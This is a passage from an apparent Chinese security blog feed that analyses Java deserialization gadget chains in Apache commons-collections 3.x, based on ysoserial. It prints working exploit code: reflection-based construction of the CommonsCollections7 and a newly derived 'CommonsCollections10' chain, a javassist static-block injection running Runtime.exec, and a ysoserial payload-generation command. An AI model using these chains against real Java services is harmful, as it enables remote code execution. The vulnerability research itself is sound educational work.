class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br><span class="line">Field f = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField("map");//获取HashSet的map Field对象</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(f);<span class="comment">// 设置map可被访问修改</span></span><br><span class="line">HashMap innimpl = <span class="keyword">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);<span class="comment">// 获取map实例的map类属性</span></span><br><span class="line"></span><br><span class="line">Field f2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("table");// 获取HashMap的 table field</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(f2);<span class="comment">// 设置HashMap的field 可被访问</span></span><br><span class="line">Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line">Object node = array[<span class="number">0</span>];<span class="comment">// 获取Node&lt;k,v&gt;实例</span></span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);<span class="comment">// 获取Node的key field</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(keyField);<span class="comment">// 设置该Field可被访问修改</span></span><br><span class="line">keyField.set(node, entry);<span class="comment">// 对node实例填充key的值为TiedMapEntry实例</span></span><br></pre></td></tr></table></figure><p>经过上面的操作，最终的HashSet实例被我们嵌入了构造好的TiedMapEntry实例。</p><p>这里在调试的过程中，发现用ysoserail的Reflections来简化exp，出来的结果有点不一样，还没有找到具体的原因。如果有师傅遇到过这种问题，欢迎一起讨论讨论！</p><hr><h3 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h3><p>CommonsCollections利用的是key的hash冲突的方法来触发<code>equals</code>函数，该函数会调用<code>LazyMap.get</code>函数</p><p>那么构造exp的关键就是构造一个hash冲突的LazyMap了。</p><p>这里大家可以跟一下String.hashCode函数，他的计算方法存在不同字符串相同hash的可能性，例如如下代码</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031172937969.png" alt="image-20191031172937969"></p><p>CommonsCollections7用的就是这个bug来制造hash冲突。</p><p>这里需要提一点的是触发LazyMap.get函数</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031181203017.png" alt="image-20191031181203017"></p><p>要走到第151行红框框上，首先需要满足的是<code>map</code>里不存在当前这个<code>key</code></p><p>但是明显在第一次不存在这个<code>key</code>后，会更新<code>map</code>的键值，这将导致下次同样的<code>key</code>进来，就不会触发后续的payload了。我们在写exp的时候需要注意到这一点。</p><p>来看一下ysoserial的CommonsCollections7是怎么编写的！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"><span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">lazyMap2.remove(<span class="string">"yy"</span>);</span><br></pre></td></tr></table></figure><p>其中第两次的put会使得会使得LazyMap2中增加了yy这个键值，为了保证反序列化后仍然可以触发后续的利用链，这里需要将lazyMap2的yy键值remove掉。</p><h2 id="6-构造新CommonsCollections10"><a href="#6-构造新CommonsCollections10" class="headerlink" title="6. 构造新CommonsCollections10"></a>6. 构造新CommonsCollections10</h2><p>经过对前面1,3,5,6,7的分析，我们其实可以发现很多payload都是“杂交”的成果。那么我们是否能根据前面的分析，构造出一个新的CommonsCollections的payload呢？答案当然是肯定的，接下来讲一下我找到的一个新payload利用。</p><p>这个payload为CommonsCollections6和7的结合，同CommonsCollections6类似，这里也用到了<code>TiedMapEntry</code>的<code>hashCode</code>函数</p><p>我们在分析<code>Hashtable</code>的<code>reconstitutionPut</code>函数时，看下图</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031183753047.png" alt="image-20191031183753047"></p><p>该函数在第1234行对<code>key</code>调用了一次<code>hashCode</code>函数，那么很明显，如果key值被代替为构造好的<code>TiedMapEntry</code>实例，这里我们就能触发<code>LazyMap.get</code>函数，后续的调用链就类似了。</p><p>整理一下利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">-&gt; Hashtable.reconstitutionPut</span><br><span class="line">-&gt; key.hashCode() =&gt; TiedMapEntry.hashCode()</span><br><span class="line">-&gt; TiedMapEntry.getValue</span><br><span class="line">-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; 前文构造的Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>其实从利用链来看，与CommonsCollections6的区别在于前部的触发使用了不同的对象。</p><p>接下来，结合第5点的学习，我们来写一下这个payload的利用链exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 获取hashtable的table类属性</span></span><br><span class="line">Field tableField = Hashtable.class.getDeclaredField("table");</span><br><span class="line">Permit.setAccessible(tableField);</span><br><span class="line">Object[] table = (Object[])tableField.get(hashtable);</span><br><span class="line">Object entry1 = table[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(entry1==<span class="keyword">null</span>)</span><br><span class="line">    entry1 = table[<span class="number">1</span>];</span><br><span class="line"><span class="comment">// 获取Hashtable.Entry的key属性</span></span><br><span class="line">Field keyField = entry1.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">Permit.setAccessible(keyField);</span><br><span class="line"><span class="comment">// 将key属性给替换成构造好的TiedMapEntry实例</span></span><br><span class="line">keyField.set(entry1, entry);</span><br><span class="line"><span class="comment">// 填充真正的命令执行代码</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"><span class="keyword">return</span> hashtable;</span><br></pre></td></tr></table></figure><h2 id="7-梅子酒师傅的CommonsCollections9"><a href="#7-梅子酒师傅的CommonsCollections9" class="headerlink" title="7. 梅子酒师傅的CommonsCollections9"></a>7. 梅子酒师傅的CommonsCollections9</h2><p>找到上面CommonsCollections10时，在网上找了一下有没有师傅已经挖到过了，一共找到下面三位师傅</p><ul><li><a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a></li><li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d</a></li><li><a href="https://github.com/frohoff/ysoserial/pull/116" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/pull/116</a></li></ul><p>一个一个来说</p><ol><li><p>第一个<a href="https://github.com/Jayl1n" target="_blank" rel="noopener">Jayl1n</a>师傅做的改变主要是最终的Runtime.getRuntime().exec改成了URLClassLoader.loadClass().newInstance的方式，前面用的还是CommonsCollections6，这里暂时不将其归类为新的利用链。</p></li><li><p>第二个是<strong><a href="https://github.com/meizjm3i" target="_blank" rel="noopener">梅子酒</a></strong>师傅提交的CommonsCollections9，主要利用的是CommonsCollections:3.2版本新增的<code>DefaultedMap</code>来代替<code>LazyMap</code>，因为这两个Map有同样的get函数可以被利用，这里不再具体分析。</p></li><li>第三个是<strong><a href="https://github.com/navalorenzo" target="_blank" rel="noopener">navalorenzo</a></strong>师傅提交的CommonsCollections8，其利用链基于CommonsCollections:4.0版本，暂时不在本篇文章的分析范围内，后面会好好分析一下。</li></ol><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>联合前面两篇文章<a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-vulnerability/">CommonsCollections1</a>、<a href="http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3/">CommonsCollections3</a>，在加上本文的CommonsCollections5，6，7，9，10。</p><p>由于网上已经有类似的文章做了<a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">总结</a>，这里就简单做一下CommonsCollections&lt;=3.2.1下的反序列化利用链的总结。</p><hr><ul><li>起始点<ol><li><code>AnnotationInvocationHandler</code>的<code>readObject</code></li><li><code>BadAttributeValueExpException</code>的<code>readObject</code></li><li><code>HashSet</code>的<code>readObject</code></li><li><code>Hashtable</code>的<code>readObject</code></li></ol></li><li>重要的承接点<ol><li><code>LazyMap</code>的<code>get</code></li><li><code>DefaultedMap</code>的<code>get</code></li><li><code>TiedMapEntry</code>的<code>getValue</code></li><li><code>Proxy</code>的<code>invoke</code></li></ol></li><li>终点<ol><li><code>ChainedTransformer</code>的<code>transform</code></li><li><code>InvokerTransformer</code>的<code>transform</code></li><li><code>ConstantTransformer</code>的<code>transform</code></li></ol></li></ul><hr><p>各exp的jdk适用版本</p><ol><li>jdk7 =&gt; CommonsCollection1、3</li><li>jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10</li></ol><p>各exp的commons-collections适用版本</p><ol><li>commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10</li><li>commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10</li></ol><hr><p>最后的最后，commons-collections:3.x版本的反序列化利用链就分析到这里，其实我相信如果想继续挖可代替的利用链还是会有的，就像本文挖到的CommonsCollections10，如果各位师傅有兴趣可以继续挖下去，也欢迎和各位师傅一起交流。</p><p>后续还会把commons-collections:4版本的利用链做一个分析，欢迎一起交流：）</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化利用链挖掘之CommonsCollections3</title>
      <link href="2019/10/28/java/study-java-deserialized-commonscollections3-3/"/>
      <url>2019/10/28/java/study-java-deserialized-commonscollections3-3/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前面分析了ysoserial的CommonsCollections1，熟悉了一点Java反序列化。本文将继续分析ysoserial的利用，今天的主角是CommonsCollections3.</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>首先由于override的原因，环境使用的是jdk7u80。利用ysoserial生成payload，并载入调试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections3 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections3.ser</span><br></pre></td></tr></table></figure><h1 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h1><p>在分析开始前，先补充一下基础知识</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticBlockTest</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cracker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] generate()&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String code = <span class="string">"&#123;java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");&#125;"</span>;</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            CtClass clazz = pool.get(StaticBlockTest<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">            clazz.setName(<span class="string">"demo"</span>);</span><br><span class="line">            clazz.makeClassInitializer().insertAfter(code);</span><br><span class="line">            <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] clazz = generate();</span><br><span class="line">        DefiningClassLoader loader = <span class="keyword">new</span> DefiningClassLoader();</span><br><span class="line">        Class cls = loader.defineClass(<span class="string">"demo"</span>,clazz);<span class="comment">// 从字节数组中恢复类</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cls.newInstance(); <span class="comment">// 实例化该类时会自动调用静态块内的代码</span></span><br><span class="line">        &#125; </span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面这个例子，我们可以获得的知识点主要为两点：</p><p>​        a. defineClass可以从byte数组中恢复一个Class</p><p>​       b. static initializer在类载入时将自动执行（静态块内的代码）</p><p>Java中动态调用的另一种方式是<code>defineClass</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025190617899.png" alt="image-20191025190617899"></p><p>Java提供了ClassLoader从bytes数组中还原Class的方法，defineClass函数就是完成这一过程的函数。</p><p>理论上，如果代码中使用了这种方式，且byte数据的内容可控，我们可以执行任意Java代码。为什么呢？</p><p>这里就用到了Java类的另一个特性，static block在类载入时自动执行块内的代码。我们可以通过javassist对静态块注入任意代码，该类被恢复并载入时会调用注入的代码，后文的利用链主要就是用到了这两个知识点。</p><h1 id="0x03-利用链分析"><a href="#0x03-利用链分析" class="headerlink" title="0x03 利用链分析"></a>0x03 利用链分析</h1><h2 id="1-前景回顾"><a href="#1-前景回顾" class="headerlink" title="1. 前景回顾"></a>1. 前景回顾</h2><p>这里选择CommonsCollections3是因为他的前半段触发的利用链跟CommonsCollections1是一样的，所以这里只需要分析后半段命令执行的构造即可。回顾一下前半段利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt; memberValues.entrySet()</span><br><span class="line">-&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">-&gt; memberValues.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; iTransformers[].transform()</span><br></pre></td></tr></table></figure><p>CommonsCollections1中ChainedTransformer.transform()会循环调用iTransformers数组里的对象的transform函数。CommonsCollections1用的是InvokerTransformer的transform，因为该函数实现了反射调用任意类的功能。那么除了使用InvokerTransformer还有没有其他的方法？答案当然是肯定的！</p><h2 id="2-新的命令执行利用链"><a href="#2-新的命令执行利用链" class="headerlink" title="2. 新的命令执行利用链"></a>2. 新的命令执行利用链</h2><p>来看一下CommonsCollections3的payloads构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">      <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">      <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">            new Class[] &#123; Templates.class &#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"><span class="comment">// 后续类似 省略</span></span><br></pre></td></tr></table></figure><p><code>ConstantTransformer</code>上一篇已经说过了，其<code>transform</code>会返回构造时的对象，这里就是<code>TrAXFilter.class</code>对象。</p><p>我们重点来看<code>InstaniateTransformer</code>的<code>transform</code>函数</p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215544053.png" alt="image-20191025215544053"></p><p>简单来看，该函数对输入的input（这里就是TrAXFilter.class）做实例化的操作。这里看起来，其实有点像php中找对应的__constructs，在Java里我们就去找构造函数里做了危险操作的class。</p><p>来看一下<code>TrAXFilter</code>类的构造函数</p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215631300.png" alt="image-20191025215631300"></p><p>这里的<code>templates</code>就是上面exp中构造的<code>templatesImpl</code>.</p><p>继续看TransformerImpl的newTransformer函数</p><p><code>org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java:newTransformer:481</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215358907.png" alt="image-20191025215358907"></p><p>继续看<code>getTransletInstance</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215202858.png" alt="image-20191025215202858"></p><p>再继续<code>defineTransletClasses</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025215052940.png" alt="image-20191025215052940"></p><p>看到这里是不是有点熟悉，没错，这里用到了0x02中的两个基础知识。<code>defineTransletClasses</code>还原出类，<code>getTransletInstance</code>进行实例化。那么我们只需要构造一个合适的<code>_bytecodes</code>即可执行任意Java代码。</p><p>下面补充一下，在构造exp时需要满足的条件：</p><ol><li>植入的<code>templates</code>为<code>TransformerImpl</code>类，从而调用后续的<code>newTransformer</code>函数</li><li>植入的<code>templates</code>实例，<code>_name</code>不为<code>null</code>,<code>_class</code>为<code>null</code></li><li>植入的<code>templates</code>实例，<code>_bytecodes</code>不为<code>null</code>,<code>_tfactory</code>为<code>TransformerFactoryImpl</code>对象</li><li>植入的<code>templates._bytecodes</code>数组，其最终还原的对象父类为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></li></ol><p>那么怎么才能满足这些条件呢？这里神奇的javassist又要上场啦！</p><p>来看一下ysoserial的操作</p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191028155646352.png" alt="image-20191028155646352"></p><p>上面的代码不做省略，我们应该好好学习一下javassist的基本操作，代码可以在<code>Gadgets.createTemplatesImpl</code>找到！</p><p>这里框了两个框，第一个框是通过javassist注入静态块，静态块的内容就是我们需要执行的命令。第二个框是ysoserail框架自己封装的一个反射工具类，通过这个类我们可以动态的操作<code>templates</code>实例的类属性内容。这里主要就是在满足上述的几个条件。</p><p>这里有一点可以提一下，该利用链的作者在填充<code>_bytecodes</code>时，额外填充了一个无关的类(上图第130行)。这个类主要用于满足<code>_auxClasses</code>,让这个<code>getTransletInstance</code>函数能正常走完。</p><p>经过上面的分析，其实我们可以知道<code>getTransletInstance</code>的第408行，对<code>_class</code>做实例化时我们想要执行的代码就已经执行了。所以这里额外填充的类其实是可有可无的。</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>到这里，整一个CommonsCollections3就分析结束了。</p><p>CommonsCollections3主要利用了可控的byte数组从defineClass函数中还原出恶意构造的Class。并且在后续的调用中，这个Class被注入到内存中，从而执行了注入的静态块的代码，实现了任意Java代码执行。</p><p>到这篇为止，我们已经知道了两种Java的任意代码执行的构造方式</p><ol><li>利用可控的反射机制。具体的Class、Method等均可控时，利用反射机制，可以构造出任意的类调用、类函数调用</li><li>利用可控的defineClass函数的byte数组。构造恶意的Class字节码数组，常于静态块注入恶意代码</li></ol><h3 id="20191104-补充"><a href="#20191104-补充" class="headerlink" title="20191104 补充"></a>20191104 补充</h3><p>前面的分析并没有提到3.2.2版本发生了啥事，导致了利用链的失效，这里简单提一下</p><p><img src="/images/study-java-deserialized-commonscollections3-3-20191028/image-20191104193635375.png" alt="image-20191104193635375"></p><p>3.2.2版本对InvokerTransformer增加了readObject函数，并且做了是否允许反序列化的检查，在<code>FunctorUtils.checkUnsafeSerialization</code>函数内。</p><p><img src="/images/study-java-deserialized-commonscollections3-3-20191028/image-20191104194440916.png" alt="image-20191104194440916"></p><p>这里UNSAFE_SERIALIZABLE_PROPERTY的值默认为false，如果需要为true，需要在运行时指定。</p><p>所以在使用InvokerTransformer作为反序列化利用链的一部分时，会throw一个exception。除了InvokerTransformer类外，还有CloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,<br>PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosure。所以在3.2.2版本以上，基本上利用链都已经废了。</p><p>当然，这种方法治标不治本，如果可以在这些类以外，构造一个利用链同样可以达到前面的效果。</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化利用链挖掘之CommonsCollections1</title>
      <link href="2019/10/24/java/study-java-deserialized-commonscollections3-1/"/>
      <url>2019/10/24/java/study-java-deserialized-commonscollections3-1/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><p>前段时间在复现shiro反序列化漏洞的过程中，发现无法很好的理解CommonCollections4为什么无法执行命令，还是缺少Java的一些基础知识。所以这里就先停下了复现漏洞的进程，先将基础打扎实：）。这篇文章将记录，Java反序列化漏洞的原理以及测试环境。</p><p>参考文献都嵌入在文中。</p><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><h2 id="1-Java中的序列化和反序列化"><a href="#1-Java中的序列化和反序列化" class="headerlink" title="1. Java中的序列化和反序列化"></a>1. Java中的序列化和反序列化</h2><p>序列化：使用<code>ObjectOutputStream</code>类的<code>writeObject</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object x)</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure><p>反序列化：使用<code>ObjectInputStream</code>类的<code>readObject</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>支持序列化的对象必须满足：</p><ol><li>实现了<code>java.io.Serializable</code>接口</li><li>当前对象的所有类属性可序列化，如果有一个属性不想或不能被序列化，则需要指定<code>transient</code>，使得该属性将不会被序列化</li></ol><p>举个例子(来源于<a href="http://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">此处</a>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String address;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">transient</span> <span class="keyword">int</span> SSN;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mailCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Mailing a check to "</span> + name</span><br><span class="line">                           + <span class="string">" "</span> + address);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 